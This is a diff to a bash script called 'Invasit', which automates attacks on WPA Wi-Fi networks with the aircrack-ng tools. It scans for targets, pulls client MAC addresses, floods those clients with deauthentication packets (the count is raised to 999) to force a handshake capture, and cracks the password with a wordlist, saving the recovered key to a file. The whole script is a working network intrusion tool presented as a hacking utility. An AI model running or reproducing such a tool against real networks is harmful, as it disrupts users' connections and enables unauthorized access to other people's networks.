@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Invasit version 1 || by: valvesss
+# Invasit version 1.1 || by: valvesss
 
 ###################### PRE-CHECKS ############################
 ## From Fluxion
@@ -14,24 +14,21 @@ if [ -z "${DISPLAY:-}" ]; then
     echo -e "\e[The script should be exected inside a X (graphical) session.""\e[0m"""
     exit 1
 fi
+
 ################## SHORTCUTS/STUFFS ##########################
 
 # Air family
-deauthtime=15
+deauthtime=999
 function airodumpall {
-	xterm -title "FIND YOUR TARGET" -e airodump-ng --encrypt WPA $nic -w target -o kismet
+	xterm -title "FIND YOUR TARGET" -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
 }
 
 function airodumpgetclients {
-	xterm -title "SCANNING $networkname CLIENTS " $TOPLEFT -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic &
-}
-
-function airodumptarget {
-	xterm -title "ATTACKING $networkname NETWORK" $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o cap $nic &
+	xterm -title "SCANNING $networkname NETWORK " $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic &
 }
 
 function deauthesp {
-	xterm -title "Deauth" $BOTTOMRIGHT -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic
+	xterm -title "DEAUTHENTICATING CLIENTS" $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic &
 }
 
 function killeverybody {
@@ -40,8 +37,14 @@ function killeverybody {
 	killall airodump-ng &>/dev/null
 	killall xterm &>/dev/null			
 }
+
+function getclients {
+	cat $name-01.csv | awk 'NR==6,NR==11' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
+	nr=$(cat $mac | wc -l)
+}
+
 # Time for most functions
-st='0.2'
+st='0.3'
 
 # Colors for echo
 RED='\033[0;31m'
@@ -282,51 +285,65 @@ networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' 
 rm -rf auxfile*
 rm -rf $name-01.kismet.csv
 name=$networkname"_"$bssidtarget
-# Start airodump at the target 
+# If it found a useful handshake, advance some steps.
+	if [ -f $name-handshake.cap ]; then
+		if `aircrack-ng $name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
+			ESPSCN
+		else		
+			echo -e "\n# Handshake for this network found at: #"
+			realpath $name-hanshake.cap
+			echo -e "\n# Use it? [y/n] #"
+			read opt
+				if [ $opt = "y" ] || [ $opt = "Y" ]; then
+					mv $name-handshake.cap $name-01.cap
+					WORDLIST
+				fi	
+		fi
+	fi
 ESPSCN
 }
 
 # 4) Scan especific network to get clients
 function ESPSCN {
+# Start airodump at the target 
 airodumpgetclients
-echo "Getting mac clients..."
 airodumpgetclientsPID=$!
-sleep 5
+echo -e "\n Looking for $networname mac clients..."
 mac=$name.lst
-nr=0
-while [ $nr = 0 ]; do
-cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac	
-nr=$(cat $mac | wc -l)
-done
-SCAHAN
-}
-
-# 5) Scan network to capture the HANDSHAKE
-function SCAHAN {
-# Start scanning network target
-rm -rf $name-01.csv
-airodumptarget
-kill $airodumpgetclientsPID &> /dev/null
-echo -e "\n# 4) Scanning $networkname to get the HANDSHAKE. #"
+	# Wait untils csv to be generated
+	while [ ! -f $name-01.csv ]; do
+		:
+	done
+		# Filter mac clients
+		nr=0
+		while [ $nr = 0 ]; do
+			getclients
+		done
 ATTAIR
 }
 
 # 6) Attack using aireplay-ng
 function ATTAIR {
+echo -e "\n# 4) Scanning $networkname to get the HANDSHAKE. #"
 # Attack clients host until find handshake packet
 i=1
 	while [ $i -le $nr ]; do
 		bssidclient=$(awk -v var=$i 'NR==var' $mac)
 		deauthesp
-		sleep 1
+		sleep 2
 		let i=i+1
-	done
-		# If handshake corrupted or with no password
+		# Check if handshake is corrupted or with no password
 		if `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
-			echo -e "\n# Handshake packet not found in .cap file, trying again... #"
-			sleep 2
-			ATTAIR
+			:
+		else
+			let i=nr+1
 		fi
+		# Last loop, if didn't work, get more clients (if exist) and restart...
+		if [ $i -eq $nr ]; then
+			getclients
+			let i=1
+		fi
+	done
 # Finish useless process
 killeverybody
 # Delete MAC clients table if all right
@@ -356,10 +373,26 @@ AIRCRACK
 # 8) Decryptograph the password
 function AIRCRACK {
 # Clean handshake packet
-wpaclean $name-clean.cap $name-01.cap &> /dev/null
+wpaclean $name-handshake.cap $name-01.cap &> /dev/null
 rm -rf $name-01.cap
 # Start the wordlist method attack
-aircrack-ng $name-clean.cap -w $path 2>/dev/null
+aircrack-ng $name-handshake.cap -w $path | tee $name-passwd.txt
+cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
+rm -rf $name-passwd.txt
+## Notice if sucess or not
+	if [ -s $name-password.txt ]; then
+		echo -e "\n# Sucess !! The password is: ${RED}`cat $name-password.txt`${NC} !!!\n"
+	else
+		echo -e "\n# Sad news but... This wordlist haven't the password =/... Try again with a new one? [y/n] #"
+		read opt 2>/dev/null
+		if [ $opt = "y" ] || [ $opt = "Y" ]; then
+			WORDLIST
+		else
+			END
+		fi			
+
+	fi	
+
 echo "To finish, press ENTER..."
 read enter
 END
@@ -372,6 +405,9 @@ if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
 	iw dev $nic del
 fi
 sleep $st
+echo "[+] Deleting jerk files if exist..."
+rm -rf $name-01.csv
+sleep $st
 echo "[+] Restarting network services..."
 service NetworkManager restart
 service networking restart
@@ -379,7 +415,7 @@ sleep $st
 echo "[+] Thanks for using!"
 sleep $st
 echo -e "\n############################################################"
-echo -e "##	${RED}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
+echo -e "##	${GREEN}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
 echo "############################################################"
 exit
 }
